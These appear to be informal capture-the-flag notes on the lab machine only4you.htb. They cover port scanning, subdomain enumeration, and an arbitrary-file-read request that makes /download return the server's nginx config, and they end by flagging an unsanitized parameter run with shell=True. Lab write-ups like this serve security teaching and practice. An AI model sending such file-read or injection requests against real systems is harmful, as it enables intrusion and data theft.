 nmap 10.10.11.210           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 01:12 EDT
Nmap scan report for 10.10.11.210
Host is up (0.50s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 81.91 seconds

THe website is designed by BootstrapMade

![](20230720012606.png)

while enumerating the subdomains we found one:
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u only4you.htb -t 50 --append-domain

http://beta.only4you.htb

in beta site there is a website

![](20230720012544.png)

got the source code added here:

./beta

convert file did not happen

from the source code there is multiple html request params

/source
/list
/download
/convert
/resize

we need to send a post 
request how to intercept our post reuest using curl on the machine

curl --proxy localhost:8080 -s -X POST http://beta.only4you.htb/download -d "image=/etc/nginx/sites-enabled/default"

```
server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
        listen 80;
        server_name only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
        }
}

server {
        listen 80;
        server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
             
```

![](20230720031411.png)

intercepted traffic.

we analyse that the domain argument is not sanitized and the shell parameter is True.





